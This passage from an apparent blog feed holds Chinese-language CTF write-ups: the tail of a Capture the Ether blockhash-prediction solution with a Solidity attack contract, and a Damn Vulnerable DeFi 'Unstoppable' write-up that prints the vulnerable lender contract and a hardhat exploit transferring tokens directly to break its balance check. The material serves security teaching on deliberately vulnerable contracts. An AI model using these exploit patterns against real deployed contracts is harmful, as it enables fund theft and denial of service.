class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./PredictBlockHash.sol&quot;</span>;<br>contract attack &#123;<br>    <span class="hljs-title class_">PredictTheBlockHashChallenge</span> challenge;<br>    uint256 blockNumber;<br>bytes32 answer;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">address _addr</span>) public &#123;<br>        challenge = <span class="hljs-title class_">PredictTheBlockHashChallenge</span>(_addr);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">guess</span>(<span class="hljs-params"></span>) public payable &#123;<br>        blockNumber = block.<span class="hljs-property">number</span> + <span class="hljs-number">1</span>;<br>        challenge.<span class="hljs-property">lockInGuess</span>.<span class="hljs-title function_">value</span>(<span class="hljs-number">0.001</span> ether)(answer);<br>&#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params"></span>) public &#123;<br>        <span class="hljs-built_in">require</span>(block.<span class="hljs-property">number</span>-<span class="hljs-number">256</span> &gt; blockNumber, <span class="hljs-string">&quot;Didn&#x27;t generate 256 blocks&quot;</span>);<br>        challenge.<span class="hljs-title function_">settle</span>();<br>    &#125;<br>    <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) external payable&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>部署目标合约和攻击合约：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%876.png" class=""></p><p>先调用攻击合约的guess函数，存入0，等到生成了256个区块之后再来调用pwn函数即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Unstoppable</title>
    <link href="/2022/11/26/Unstoppable/"/>
    <url>/2022/11/26/Unstoppable/</url>
    
    <content type="html"><![CDATA[<h2 id="Damn-Vulnerable-Defi-Unstoppable-wp"><a href="#Damn-Vulnerable-Defi-Unstoppable-wp" class="headerlink" title="Damn Vulnerable Defi Unstoppable wp"></a>Damn Vulnerable Defi Unstoppable wp</h2><h3 id="1-代码分析"><a href="#1-代码分析" class="headerlink" title="1.代码分析"></a>1.代码分析</h3><p>Unstoppable 题目要求我们阻止借贷池子继续向用户借钱，这道题给了我们两个合约，一个是 ReceiverUnstoppable.sol 合约，一个是 UnstoppableLender.sol 合约，我们先看 UnstoppableLender.sol 合约。</p><h5 id="UnstoppableLender-sol"><a href="#UnstoppableLender-sol" class="headerlink" title="UnstoppableLender.sol"></a>UnstoppableLender.sol</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;<br><br>interface <span class="hljs-title class_">IReceiver</span> &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">receiveTokens</span>(<span class="hljs-params">address tokenAddress, uint256 amount</span>) external;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@title</span> <span class="hljs-variable">UnstoppableLender</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="hljs-comment"> */</span><br>contract <span class="hljs-title class_">UnstoppableLender</span> is <span class="hljs-title class_">ReentrancyGuard</span> &#123;<br><br>    <span class="hljs-title class_">IERC20</span> public immutable damnValuableToken;<br>    uint256 public poolBalance;<br><br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address tokenAddress</span>) &#123;<br>        <span class="hljs-built_in">require</span>(tokenAddress != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;Token address cannot be zero&quot;</span>);<br>        damnValuableToken = <span class="hljs-title class_">IERC20</span>(tokenAddress);<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">depositTokens</span>(<span class="hljs-params">uint256 amount</span>) external nonReentrant &#123;<br>        <span class="hljs-built_in">require</span>(amount &gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Must deposit at least one token&quot;</span>);<br>        <span class="hljs-comment">// Transfer token from sender. Sender must have first approved them.</span><br>        damnValuableToken.<span class="hljs-title function_">transferFrom</span>(msg.<span class="hljs-property">sender</span>, <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), amount);<br>        poolBalance = poolBalance + amount;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">flashLoan</span>(<span class="hljs-params">uint256 borrowAmount</span>) external nonReentrant &#123;<br>        <span class="hljs-built_in">require</span>(borrowAmount &gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Must borrow at least one token&quot;</span>);<br><br>        uint256 balanceBefore = damnValuableToken.<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>));<br>        <span class="hljs-built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="hljs-string">&quot;Not enough tokens in pool&quot;</span>);<br><br>        <span class="hljs-comment">// Ensured by the protocol via the `depositTokens` function</span><br>        <span class="hljs-title function_">assert</span>(poolBalance == balanceBefore);<br>        <br>        damnValuableToken.<span class="hljs-title function_">transfer</span>(msg.<span class="hljs-property">sender</span>, borrowAmount);<br>        <br>        <span class="hljs-title class_">IReceiver</span>(msg.<span class="hljs-property">sender</span>).<span class="hljs-title function_">receiveTokens</span>(<span class="hljs-title function_">address</span>(damnValuableToken), borrowAmount);<br>        <br>        uint256 balanceAfter = damnValuableToken.<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>));<br>        <span class="hljs-built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="hljs-string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>合约的结构很简单，只有两个函数，一个是 depositTokens 函数，一个是 flashLoan 函数，depositTokens 函数的功能是用户存钱到借贷合约，flashLoan 函数的功能是给用户借钱，我们主要看 flashLoan 函数。</p><p>flashLoan 函数中有一行特别的判断：<br><code>assert(poolBalance == balanceBefore);</code><br>要求 poolBalance 变量等于 balanceBerfore 变量，poolBalance 变量只有在调用 depositTokens 函数的时候才会增加，而 balanceBefore 是用户借钱时借贷池子的金额，所以我们可以直接向合约转账，这样 poolBalance 的值不变，balanceBefore 的值会增加，这个判断就通过不了，我们就可以阻止这个池子继续提供贷款。</p><h3 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h3><p>我们直接向 UnstoppableLender 合约转任意金额，然后用 hardhat 测试就可以了，攻击代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-property">address</span>,<span class="hljs-number">1</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
